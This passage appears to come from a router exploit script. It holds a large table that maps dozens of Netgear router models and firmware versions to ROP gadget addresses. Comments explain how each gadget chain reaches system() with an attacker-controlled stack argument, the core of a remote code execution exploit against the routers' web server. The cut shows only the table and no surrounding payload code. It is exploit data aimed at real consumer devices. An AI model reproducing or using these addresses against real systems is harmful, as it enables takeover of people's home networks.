		"1.0.0.42" : 0x20e2c,
		"1.0.0.38" : 0x20df0,
	},
	"EX6920" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.40" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.36" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.32" : [0x61e020+0x72c, 0x40b544, 0x41c7c8],
		"1.0.0.30" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.28" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.26" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.16" : [0x61e4b0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.14" : [0x61dfc0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.8"  : [0x61dfc0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.4"  : [0x61df60+0x730, 0x40b684, 0x41ea4c],
	},
	"EX7000" : {
		# 0) gadget: calls system($sp)
		"1.0.1.84" : 0x26f64,
		"1.0.1.80" : 0x26f64,
		"1.0.1.78" : 0x26d8c,
		"1.0.0.66" : 0x2352c,
		"1.0.0.62" : 0x2287c,
		"1.0.0.58" : 0x2287c,
		"1.0.0.56" : 0x2287c,
		"1.0.0.50" : 0x225d4,
		"1.0.0.42" : 0x22430,
		"1.0.0.38" : 0x22370,
		"1.0.0.36" : 0x223bc,
		"1.0.0.32" : 0x22bc0,
		"1.0.0.30" : 0x22bc0,
	},
	"LG2200D" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.0.57" : 0x44f90c,
	},
	"MBM621" : {
		# 0) gadget: calls system($sp+0x18)
		"1.1.3" : 0x4126b8,
	},
	"MBR624GU" : {
		# 0) gadget: calls system($sp)
		"6.1.30.64"   : 0x19728,
		"6.1.30.61"   : 0x19680,
		"6.1.30.59"   : 0x19680,
		"6.1.30.59NA" : 0x19394,
		"6.0.30.46"   : 0x196ac,
		"6.0.28.43"   : 0x1932c,
		"6.0.28.43NA" : 0x19618,
		"6.0.26.21"   : 0x1897c,
		"6.0.22.14NA" : 0x18190,
		"6.0.22.12"   : 0x18190,
	},
	"MBR1200" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.2.2.53" : [0x4711C0, 0x40CDD0],
	},
	"MBR1515" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.2.2.68" : [0x48CFE0, 0x412A38],
	},
	"MBR1516" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.2.2.84BM" : [0x48A210, 0x412534],
	},
	"MBRN3000" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.74"   : [0x462750, 0x40CB10],
		"1.0.0.72"   : [0x4602A0, 0x40CA20],
		"1.0.0.72NA" : [0x45FF40, 0x40CA40],
		"1.0.0.69"   : [0x45FB80, 0x40CA68],
		"1.0.0.69NA" : [0x45F7F0, 0x40CA98],
		"1.0.0.65"   : [0x45FA30, 0x40CA38],
		"1.0.0.65NA" : [0x45F6B0, 0x40CA78],
		"1.0.0.43NA" : [0x45BE74, 0x40C34C],
	},
	"MVBR1210C" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.2.0.35" : [0x48AA20, 0x41113C],
	},
	"R4500" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.0.4" : 0x4430dc,
	},
	"R6200" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.1.58" : [0x43DBA8, 0x41A4EC],
		"1.0.1.56" : [0x43DB58, 0x41A4EC],
		"1.0.1.52" : [0x43DB58, 0x41A4EC],
		"1.0.1.48" : [0x43D028, 0x41A2AC],
		"1.0.1.46" : [0x43CEB8, 0x41A0DC],
		"1.0.0.28" : [0x43B808, 0x419598],
		"1.0.0.18" : [0x43AD90, 0x418BC8],
	},
	"R6200V2" : {
		# 0) gadget: calls system($sp)
		"1.0.3.12" : 0x2c460,
		"1.0.3.10" : 0x2c430,
		"1.0.1.20" : 0x280dc,
		"1.0.1.18" : 0x280dc,
		"1.0.1.16" : 0x280dc,
		"1.0.1.14" : 0x280dc,
	},
	"R6250" : {
		# 0) gadget: calls system($sp)
		"1.0.4.38" : 0x2f2dc,
		"1.0.4.36" : 0x2f2dc,
		"1.0.4.34" : 0x2f2e4,
		"1.0.4.26" : 0x2eba0,
		"1.0.4.20" : 0x2e82c,
		"1.0.4.16" : 0x2d82c,
		"1.0.4.14" : 0x2d718,
		"1.0.4.12" : 0x2d708,
		"1.0.4.08" : 0x2d0b0,
		"1.0.4.06" : 0x2cf58,
		"1.0.4.02" : 0x2ccac,
		"1.0.3.12" : 0x2c430,
		"1.0.3.06" : 0x2c430,
		"1.0.1.84" : 0x28100,
		"1.0.1.82" : 0x28100,
		"1.0.1.80" : 0x28100,
		"1.0.0.72" : 0x27cd8,
		"1.0.0.70" : 0x27cd8,
		"1.0.0.62" : 0x27cd8,
	},
	"R6300" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.2.80" : 0x44727C,
		"1.0.2.78" : 0x446C2C,
		"1.0.2.76" : 0x446C2C,
		"1.0.2.70" : 0x446A3C,
		"1.0.2.68" : 0x446A3C,
		"1.0.2.38" : 0x44673C,
		"1.0.2.36" : 0x44673C,
		"1.0.2.26" : 0x445E1C,
		"1.0.2.14" : 0x4443CC,
		"1.0.2.10" : 0x4443CC,
		"1.0.0.90" : 0x4443CC,
		"1.0.0.68" : 0x44439C,
	},
	"R6300V2" : {
		# 0) gadget: calls system($sp)
		"1.0.4.36"  : 0x2a65c,
		"1.0.4.34"  : 0x2a65c,
		"1.0.4.32"  : 0x2A53C,
		"1.0.4.28"  : 0x29fc0,
		"1.0.4.24"  : 0x29ee8,
		"1.0.4.8"   : 0x295d0,
		"1.0.4.6"   : 0x290f0,
		"1.0.4.2"   : 0x28c10,
		"1.0.3.30"  : 0x28c10,
		"1.0.3.28"  : 0x286d4,
		"1.0.3.26"  : 0x286d4,
		"1.0.3.22"  : 0x28728,
		"1.0.3.8"   : 0x2862C,
		"1.0.3.6CH" : 0x2bd0c,
		"1.0.3.2"   : 0x2862c,
		"1.0.2.86"  : 0x27cfc,
		"1.0.2.72"  : 0x27cfc,
		"1.0.1.72"  : 0x27cd8,
	},
	"R6400" : {
		# 0) gadget: calls system($sp)
		"1.0.1.52" : 0x31994,
		"1.0.1.50" : 0x31974,
		"1.0.1.46" : 0x31884,
		"1.0.1.44" : 0x31244,
		"1.0.1.42" : 0x31204,
		"1.0.1.36" : 0x30D3C,
		"1.0.1.34" : 0x30ba8,
		"1.0.1.26" : 0x30a5c,
		"1.0.1.24" : 0x30a10,
		"1.0.1.22" : 0x30904,
		"1.0.1.20" : 0x30648,
		"1.0.1.18" : 0x302fc,
		"1.0.1.12" : 0x2fdf4,
		"1.0.1.6"  : 0x2f6b4,
		"1.0.0.26" : 0x2f6b4,
		"1.0.0.24" : 0x2e96c,
		"1.0.0.20" : 0x2e840,
		"1.0.0.14" : 0x2e924,
	},
	"R6400V2" : {
		# 0) gadget: calls system($sp)
		"1.0.4.84" : 0xf9c4,
		"1.0.4.82" : 0xf9c4,
		"1.0.4.78" : 0xf980,
		"1.0.3.66" : 0xf0b0,
		"1.0.2.66" : 0xf0b0,
		"1.0.2.62" : 0xf0b0,
		"1.0.2.60" : 0xf038,
		"1.0.2.56" : 0x32078,
		"1.0.2.52" : 0x31718,
		"1.0.2.50" : 0x314c4,
		"1.0.2.46" : 0x31414,
		"1.0.2.44" : 0x313e8,
		"1.0.2.34" : 0x30e54,
		"1.0.2.32" : 0x30e1c,
		"1.0.2.14" : 0x30a94,
	},
	"R6700" : {
		# 0) gadget: calls system($sp)
		"1.0.2.8"  : 0x3cfa0,
		"1.0.2.6"  : 0x38ff4,
		"1.0.1.48" : 0x3818c,
		"1.0.1.46" : 0x37e3c,
		"1.0.1.44" : 0x37d1c,
		"1.0.1.36" : 0x3779c,
		"1.0.1.32" : 0x37704,
		"1.0.1.26" : 0x371f8,
		"1.0.1.22" : 0x361d0,
		"1.0.1.20" : 0x35d8c,
		"1.0.1.16" : 0x35750,
		"1.0.1.14" : 0x2efac,
		"1.0.0.26" : 0x2ed28,
		"1.0.0.24" : 0x2ed28,
		"1.0.0.2"  : 0x2d5c8,
	},
	"R6700V3" : {
		# 0) gadget: calls system($sp)
		"1.0.4.84" : 0xf9c4,
		"1.0.4.82" : 0xf9c4,
		"1.0.4.78" : 0xf980,
		"1.0.3.66" : 0xf0b0,
		"1.0.2.66" : 0xf0b0,
		"1.0.2.62" : 0xf0b0,
		"1.0.2.60" : 0xf038,
		"1.0.2.56" : 0x32078,
		"1.0.2.52" : 0x31718,
	},
	"R6900" : {
		# 0) gadget: calls system($sp)
		"1.0.2.8"  : 0x3cfa0,
		"1.0.2.6"  : 0x38ff4,
		"1.0.2.4"  : 0x38a3c,
		"1.0.1.48" : 0x3818c,
		"1.0.1.46" : 0x37e3c,
		"1.0.1.44" : 0x37d1c,
		"1.0.1.34" : 0x379e4,
		"1.0.1.28" : 0x3794c,
		"1.0.1.26" : 0x371f8,
		"1.0.1.22" : 0x361d0,
		"1.0.1.20" : 0x35d8c,
		"1.0.1.16" : 0x35750,
		"1.0.1.14" : 0x2efb4,
		"1.0.0.4"  : 0x2ed30,
		"1.0.0.2"  : 0x2ed30,
	},
	"R6900P" : {
		# 0) gadget: calls system($sp)
		"1.3.1.64" : 0x3a21c,
		"1.3.1.44" : 0x39904,
		"1.3.1.26" : 0x37114,
		"1.3.0.20" : 0x37114,
		"1.3.0.8"  : 0x36ff4,
		"1.2.0.22" : 0x36ad0,
		"1.0.1.14" : 0x369f4,
		"1.0.0.58" : 0x367b8,
		"1.0.0.46" : 0x3600c,
	},
	"R7000" : {
		# 0) gadget: calls system($sp)
		"0.96"   : 0x2c990,
		"1.22"   : 0x2cc00,
		"2.16"   : 0x2cbec,
		"2.19"   : 0x2d04c,
		"3.24"   : 0x2d608,
		"3.56"   : 0x2d568,
		"3.60"   : 0x2de64,
		"3.68"   : 0x2d5c8,
		"3.80"   : 0x2d5c0,
		"4.18"   : 0x2ecac,
		"4.28"   : 0x2ecf4,
		"4.30"   : 0x2ed30,
		"5.64"   : 0x32520,
		"5.70"   : 0x32768,
		"7.2"    : 0x32768,
		"7.6"    : 0x329e8,
		"7.10"   : 0x32a44,
		"7.12"   : 0x36070,
		"8.34"   : 0x37528,
		"9.6"    : 0x3763C,
		"9.10"   : 0x3794C,
		"9.12"   : 0x3794C,
		"9.14"   : 0x37B08,
		"9.18"   : 0x37B14,
		"9.26"   : 0x37d1c,
		"9.28"   : 0x37dbc,
		"9.32"   : 0x38198,
		"9.34"   : 0x38174,
		"9.42"   : 0x38978,
		"9.60"   : 0x38FF4,
		"9.64"   : 0x3C3C4,
		"9.88"   : 0x3cfb4,
		"11.100" : 0x3d000,
	},
	"R7000P" : {
		# 0) gadget: calls system($sp)
		"1.3.1.64" : 0x3a21c,
		"1.3.1.44" : 0x39904,
		"1.3.1.26" : 0x37114,
		"1.3.0.20" : 0x37114,
		"1.3.0.8"  : 0x36ff4,
		"1.2.0.22" : 0x36ad0,
		"1.0.1.14" : 0x369f4,
		"1.0.0.58" : 0x367b8,
		"1.0.0.56" : 0x36658,
		"1.0.0.50" : 0x35f40,
		"1.0.0.46" : 0x3600c,
		"1.0.0.44" : 0x35dc8,
	},
	"R7100LG" : {
		# 0) gadget: calls system($sp)
		"1.0.0.52" : 0x342d4,
		"1.0.0.50" : 0x341e4,
		"1.0.0.48" : 0x33ec0,
		"1.0.0.46" : 0x33e80,
		"1.0.0.42" : 0x339ac,
		"1.0.0.40" : 0x3397c,
		"1.0.0.38" : 0x338d8,
		"1.0.0.36" : 0x338d8,
		"1.0.0.34" : 0x3381c,
		"1.0.0.32" : 0x33788,
		"1.0.0.30" : 0x33520,
		"1.0.0.28" : 0x3326c,
		"1.0.0.24" : 0x32f30,
	},
	"R7300" : {
		# 0) gadget: calls system($sp)
		"1.0.0.74" : 0x33fb0,
		"1.0.0.70" : 0x33fb8,
		"1.0.0.68" : 0x33b70,
		"1.0.0.62" : 0x33740,
		"1.0.0.60" : 0x33588,
		"1.0.0.56" : 0x33468,
		"1.0.0.54" : 0x33458,
		"1.0.0.52" : 0x331d0,
		"1.0.0.46" : 0x32d20,
		"1.0.0.44" : 0x32ae4,
		"1.0.0.32" : 0x3267c,
		"1.0.0.26" : 0x32628,
	},
	"R7850" : {
		# 0) gadget: calls system($sp)
		"1.0.5.48" : 0x36dd0,
		"1.0.4.46" : 0x36da8,
		"1.0.4.42" : 0x365b0,
	},
	"R7900" : {
		# 0) gadget: calls system($sp)
		"1.0.4.22" : 0x36da8,
		"1.0.3.18" : 0x36da8,
		"1.0.3.10" : 0x36c80,
		"1.0.3.8"  : 0x365b0,
		"1.0.2.16" : 0x36110,
		"1.0.2.10" : 0x346d8,
		"1.0.1.26" : 0x34028,
		"1.0.1.18" : 0x33fe4,
		"1.0.1.12" : 0x336f8,
		"1.0.1.8"  : 0x332dc,
		"1.0.1.4"  : 0x33058,
		"1.0.0.10" : 0x3290c,
		"1.0.0.8"  : 0x326ec,
		"1.0.0.6"  : 0x2f48c,
		"1.0.0.2"  : 0x2f470,
	},
	"R8000" : {
		# 0) gadget: calls system($sp)
		"1.0.4.46"  : 0x36dac,
		"1.0.4.28"  : 0x365b0,
		"1.0.4.18"  : 0x36110,
		"1.0.4.12"  : 0x346d8,
		"1.0.4.4"   : 0x34310,
		"1.0.4.2"   : 0x34284,
		"1.0.3.54"  : 0x34028,
		"1.0.3.48"  : 0x33fe4,
		"1.0.3.46"  : 0x33e84,
		"1.0.3.36"  : 0x33ac4,
		"1.0.3.32"  : 0x336f8,
		"1.0.3.26"  : 0x332dc,
		"1.0.3.4"   : 0x33058,
		"1.0.2.46"  : 0x3290c,
		"1.0.2.44"  : 0x326f4,
		"1.0.1.16"  : 0x2f370,
		"1.0.0.110" : 0x2f2a0,
		"1.0.0.108" : 0x2f2a8,
		"1.0.0.102" : 0x2f2a0,
		"1.0.0.100" : 0x2f0f0,
		"1.0.0.90"  : 0x2f0e8,
		"1.0.0.76"  : 0x2f0ac,
		"1.0.0.74"  : 0x2f068,
		"1.0.0.68"  : 0x2f0ac,
		"1.0.0.46"  : 0x2f0ac,
	},
	"R8300" : {
		# 0) gadget: calls system($sp)
		"1.0.2.130" : 0x35B18,
		"1.0.2.128" : 0x35B18,
		"1.0.2.122" : 0x355fc,
		"1.0.2.116" : 0x35258,
		"1.0.2.106" : 0x34f40,
		"1.0.2.100" : 0x34d38,
		"1.0.2.94"  : 0x34d8c,
		"1.0.2.86"  : 0x348b8,
		"1.0.2.80"  : 0x348b8,
		"1.0.2.48"  : 0x340b8,
	},
	"R8500" : {
		# 0) gadget: calls system($sp)
		"1.0.2.130" : 0x35b18,
		"1.0.2.128" : 0x35B18,
		"1.0.2.122" : 0x355fc,
		"1.0.2.116" : 0x35258,
		"1.0.2.106" : 0x34f40,
		"1.0.2.100" : 0x34d38,
		"1.0.2.94"  : 0x34d8c,
		"1.0.2.86"  : 0x348b8,
		"1.0.2.80"  : 0x348b8,
		"1.0.2.64"  : 0x34104,
		"1.0.2.54"  : 0x33f30,
		"1.0.2.30"  : 0x33dd4,
		"1.0.2.26"  : 0x33d9c,
		"1.0.0.56"  : 0x33da8,
		"1.0.0.52"  : 0x33da8,
		"1.0.0.42"  : 0x33da8,
		"1.0.0.28"  : 0x33da8,
	},
	"RS400" : {
		# 0) gadget: calls system($sp)
		"1.5.0.34" : 0x10120,
	},
	"WGR614V8" : {
		# 0) gadget: calls system($sp+0x18)
		"1.2.10"   : 0x43B9C0,
		"1.2.10NA" : 0x43B9C0,
		"1.1.24"   : 0x43A46C,
		"1.1.24NA" : 0x43A46C,
		"1.1.2"    : 0x438DAC,
		"1.1.2NA"  : 0x438DCC,
		"1.1.11"   : 0x43A56C,
		"1.1.11NA" : 0x43A56C,
		"1.1.1NA"  : 0x438A8C,
		"1.1.20"   : 0x43A56C,
		"1.1.20NA" : 0x43A56C,
	},
	"WGR614V9" : {
		# 0) gadget: calls system($sp+0x30)
		"1.2.32"   : 0x450280,
		"1.2.32NA" : 0x450290,
		"1.2.30"   : 0x450280,
		"1.2.30NA" : 0x450290,
		"1.2.24"   : 0x44E730,
		"1.2.24NA" : 0x44E750,
		"1.2.6"    : 0x44C72C,
		"1.2.6NA"  : 0x44C74C,
		"1.2.2"    : 0x44D1BC,
		"1.2.2NA"  : 0x44D1DC,
		"1.0.18"   : 0x450E3C,
		"1.0.18NA" : 0x450D8C,
		"1.0.15"   : 0x44FD60,
		"1.0.15NA" : 0x44FDA0,
		"1.0.9NA"  : 0x44EE40,
	},
	"WGR614V10" : {
		# 0) gadget: calls system($sp+0x30)
		"1.0.2.66"   : 0x480294,
		"1.0.2.66NA" : 0x47FEEC,
		"1.0.2.60"   : 0x47F6CC,
		"1.0.2.60NA" : 0x47FA94,
		"1.0.2.58NA" : 0x47FA94,
		"1.0.2.54"   : 0x4775B4,
		"1.0.2.54NA" : 0x4775B4,
		"1.0.2.26"   : 0x46A5E4,
		"1.0.2.26NA" : 0x46A5F4,
		"1.0.2.18"   : 0x467D7C,
		"1.0.2.18NA" : 0x467D8C,
	},
	"WGT624V4" : {
		# 0) gadget: calls system($sp+0x18)
		"2.0.13.2" : 0x42AFF4,
		"2.0.13"   : 0x42AFF4,
		"2.0.13NA" : 0x42AFF4,
		"2.0.12"   : 0x42AFA4,
		"2.0.12NA" : 0x42AFA4,
		"2.0.6NA"  : 0x42A1F4,
	},
	"WN2500RP" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.30" : 0x44E780,
		"1.0.0.26" : 0x44E780,
		"1.0.0.24" : 0x44E780,
	},
	"WN2500RPV2" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.1.54" : 0x46335C,
		"1.0.1.50" : 0x462AFC,
		"1.0.1.46" : 0x460E54,
		"1.0.1.42" : 0x460D44,
		"1.0.0.30" : 0x44A804,
	},
	"WN3000RP" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s3 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.2.64" : [0x443048, 0x40EA14],

		# 0) gadget: calls system($sp+0x18)
		"1.0.1.36" : 0x4395e0,
		"1.0.1.34" : 0x4395d0,
		"1.0.1.18" : 0x438440,
		"1.0.0.12" : 0x445370,
	},
	"WN3100RP" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.20" : 0x439750,
		"1.0.0.16" : 0x439550,
		"1.0.0.14" : 0x439290,
		"1.0.0.6"  : 0x439400,
	},
	"WN3500RP" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.22" : [0x436BC4, 0x415C68],
		"1.0.0.20" : [0x436BD4, 0x415C98],
		"1.0.0.18" : [0x436BA4, 0x415C40],
		"1.0.0.16" : [0x436C74, 0x415BF0],
		"1.0.0.14" : [0x436E44, 0x415D90],
		"1.0.0.12" : [0x436DC4, 0x415D90],
	},
	"WNCE3001" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.50" : 0x412c68,
		"1.0.0.46" : 0x412c68,
		"1.0.0.44" : 0x412c68,
		"1.0.0.38" : 0x412bb8,
	},
	"WNDR3300" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.45"   : 0x432C6C,
		"1.0.45NA" : 0x432C6C,
		"1.0.29"   : 0x431EDC,
		"1.0.29NA" : 0x431EDC,
		"1.0.27NA" : 0x4389EC,
		"1.0.26"   : 0x4388CC,
		"1.0.26NA" : 0x4388CC,
		"1.0.23NA" : 0x43919C,
		"1.0.14"   : 0x438A8C,
		"1.0.14NA" : 0x438A8C,
	},
	"WNDR3300V2" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.26" : 0x448020,
	},
	"WNDR3400" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.52" : [0x490950, 0x412DF8],
		"1.0.0.50" : [0x4908C0, 0x412DF8],

		# 0) gadget: calls system($sp+0x18)
		"1.0.0.38" : 0x4B6880,
		"1.0.0.34" : 0x4B6320,
	},
	"WNDR3400V2" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.0.54" : 0x44858C,
		"1.0.0.52" : 0x44848C,
		"1.0.0.38" : 0x44632C,
		"1.0.0.34" : 0x44629C,
		"1.0.0.16" : 0x4420DC,
		"1.0.0.12" : 0x4420DC,
	},
	"WNDR3400V3" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.1.24" : 0x44C4BC,
		"1.0.1.22" : 0x44BFFC,
		"1.0.1.18" : 0x44BABC,
		"1.0.1.16" : 0x44B7EC,
		"1.0.1.14" : 0x44B53C,
		"1.0.1.12" : 0x44929C,
		"1.0.1.8"  : 0x448CEC,
		"1.0.1.4"  : 0x448A2C,
		"1.0.1.2"  : 0x448A2C,
		"1.0.0.48" : 0x448A2C,
		"1.0.0.46" : 0x448A2C,
		"1.0.0.38" : 0x44717C,
		"1.0.0.22" : 0x44626C,
		"1.0.0.20" : 0x44623C,
	},
	"WNDR3700V3" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x25, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.42" : [0x610070+0x72c, 0x40BB10, 0x4206FC],
		"1.0.0.38" : [0x60e3d0+0x71c, 0x40BA14, 0x41FB70],
		"1.0.0.36" : [0x60d080+0x71c, 0x40B92C, 0x41F8B0],
		"1.0.0.30" : [0x60d080+0x71c, 0x40B92C, 0x41F8B0],
		"1.0.0.22" : [0x608f50+0x720, 0x40B868, 0x41F6A0],

		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.18" : [0x490590, 0x490550],
	},
	"WNDR4000" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x25, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.2.10" : [0x6397f0+0x73c, 0x40BBC8, 0x420E6C],
		"1.0.2.6"  : [0x60ffe0+0x72c, 0x40BAB4, 0x42066C],
		"1.0.2.4"  : [0x60e040+0x720, 0x40B9B0, 0x41FB50],
		"1.0.2.2"  : [0x60da60+0x720, 0x40B91C, 0x41F8E0],
		"1.0.0.94" : [0x60da60+0x720, 0x40B91C, 0x41F8E0],
		"1.0.0.90" : [0x60cfa0+0x71c, 0x40B8C0, 0x41F890],
		"1.0.0.88" : [0x608f20+0x71c, 0x40B844, 0x41F680],

		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.82" : [0x490860, 0x490820],
		"1.0.0.66" : [0x48CDC0, 0x48CD80],
	},
	"WNDR4500" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.1.46" : 0x447D5C,
		"1.0.1.40" : 0x44719C,
		"1.0.1.38" : 0x4460ec,
		"1.0.1.36" : 0x4460ec,
		"1.0.1.20" : 0x4459fc,
		"1.0.1.18" : 0x44584C,
		"1.0.1.6"  : 0x4430dc,
		"1.0.0.58" : 0x44257C,
		"1.0.0.50" : 0x44257c,
		"1.0.0.40" : 0x44257c,
	},
	"WNDR4500V2" : {
		# 0) gadget: calls system($sp+0x78)
		"1.0.0.72" : 0x45005C,
		"1.0.0.68" : 0x44FF2C,
		"1.0.0.64" : 0x44F99C,
		"1.0.0.62" : 0x44F09C,
		"1.0.0.60" : 0x44EE5C,
		"1.0.0.56" : 0x44EE5C,
		"1.0.0.54" : 0x44E0FC,
		"1.0.0.50" : 0x44D6DC,
		"1.0.0.42" : 0x44D6DC,
		"1.0.0.36" : 0x4467EC,
		"1.0.0.26" : 0x44621C,
	},
	"WNR834BV2" : {
		# 0) gadget: calls system($sp+0x18)
		"2.1.13"   : 0x43902C,
		"2.1.13NA" : 0x43902C,
		"2.0.8"    : 0x43894C,
		"2.0.8NA"  : 0x43894C,
		"1.0.32"   : 0x43799C,
		"1.0.32NA" : 0x43799C,
	},
	"WNR1000V3" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.2.72"   : 0x460060,
		"1.0.2.72NA" : 0x460060,
		"1.0.2.68"   : 0x45F604,
		"1.0.2.68NA" : 0x45F604,
		"1.0.2.62"   : 0x454BB4,
		"1.0.2.62NA" : 0x454BB4,
		"1.0.2.60"   : 0x454BB4,
		"1.0.2.60NA" : 0x454BB4,
		"1.0.2.54"   : 0x450ED0,
		"1.0.2.54NA" : 0x450ED0,
		"1.0.2.28"   : 0x4448A0,
		"1.0.2.28NA" : 0x4448A0,
		"1.0.2.26"   : 0x4446A0,
		"1.0.2.26NA" : 0x4446A0,
		"1.0.2.18"   : 0x442D50,
		"1.0.2.18NA" : 0x442D50,
		"1.0.2.4"    : 0x440F70,
	},
	"WNR2000V2" : {
		# 0) gadget: calls system($sp+0x78)
		"1.2.0.8"    : 0x434D04,
		"1.2.0.8NA"  : 0x434CF4,
		"1.2.0.6"    : 0x433F34,
		"1.2.0.6NA"  : 0x433F34,
		"1.2.0.4"    : 0x433EA4,
		"1.2.0.4NA"  : 0x433E94,

		# 0) gadget: calls system($sp+0x18)
		"1.0.0.40"   : 0x4446A0,
		"1.0.0.40NA" : 0x4446A0,
		"1.0.0.35"   : 0x43F340,
		"1.0.0.34"   : 0x43F340,
		"1.0.0.34NA" : 0x43F340,
	},
	"WNR3500" : {
		# 0) gadget: calls system($sp)
		"1.0.36NA" : 0x2CBD0,
		"1.0.30"   : 0x2a714,
		"1.0.29NA" : 0x2a72c,
		"1.0.22"   : 0x2a4c4,
		"1.0.22NA" : 0x2a4fc,
		"1.0.15NA" : 0x2a3c8,
		"1.0.10NA" : 0x2a1f4,
	},
	"WNR3500V2" : {
		# 0) gadget: calls system($sp+0xac)
		"1.2.2.28"   : 0x435FA0,
		"1.2.2.28NA" : 0x435F60,

		# 0) gadget: calls system($sp+0x18)
		"1.0.2.14"   : 0x48D1EC,
		"1.0.2.14NA" : 0x48CFAC,
		"1.0.2.10"   : 0x484D5C,
		"1.0.2.10NA" : 0x484B1C,
		"1.0.0.64"   : 0x4350DC,
		"1.0.0.64NA" : 0x4350DC,
	},
	"WNR3500L" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		# 2) gadget: set $a0 to $sp+0x40, and calls memset
		"1.2.2.48NA" : [0x5740f0+0x630, 0x409830, 0x409D30],
		"1.2.2.44"   : [0x5740f0+0x630, 0x409830, 0x409D30],
		"1.2.2.44NA" : [0x5740f0+0x630, 0x409830, 0x409D30],
		"1.2.2.40"   : [0x568490+0x618, 0x4095AC, 0x409AB4],
		"1.2.2.40NA" : [0x568360+0x618, 0x4095AC, 0x409AB4],
		"1.2.2.30"   : [0x568490+0x618, 0x4095AC, 0x409AB4],
		"1.2.2.30NA" : [0x568360+0x618, 0x4095AC, 0x409AB4],

		# 0) gadget: calls system($sp+0x18)
		"1.0.2.50"   : 0x4A6574,
		"1.0.2.50NA" : 0x4A6334,
		"1.0.2.26"   : 0x4A3B7C,
		"1.0.2.26NA" : 0x4A392C,
		"1.0.0.88"   : 0x438564,
		"1.0.0.88NA" : 0x438564,
		"1.0.0.86"   : 0x438564,
		"1.0.0.86NA" : 0x438564,
	},
	"WNR3500LV2" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x80 and calls $t9
		"1.2.0.56" : [0x4458F8, 0x4A6EDC],
		"1.2.0.54" : [0x4456C8, 0x4A6BEC],
		"1.2.0.50" : [0x445578, 0x4A68EC],
		"1.2.0.48" : [0x445268, 0x4A4814],
		"1.2.0.46" : [0x444BF8, 0x4A4098],
		"1.2.0.44" : [0x445038, 0x4A3C18],
		"1.2.0.40" : [0x443C28, 0x4A2808],
		"1.2.0.38" : [0x443C18, 0x4A2718],
		"1.2.0.34" : [0x4436F8, 0x4A1674],
		"1.2.0.32" : [0x4436F8, 0x4A1674],
		"1.2.0.28" : [0x4436F8, 0x4A1684],
		"1.2.0.26" : [0x4436F8, 0x4A1684],
		"1.2.0.20" : [0x43A8B8, 0x492D00],
		"1.2.0.18" : [0x43A8B8, 0x492D00],
		"1.2.0.16" : [0x43A8B8, 0x492D00],
		"1.0.0.14" : [0x43758C, 0x48A850],

		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.10" : [0x4371FC, 0x4177B0],
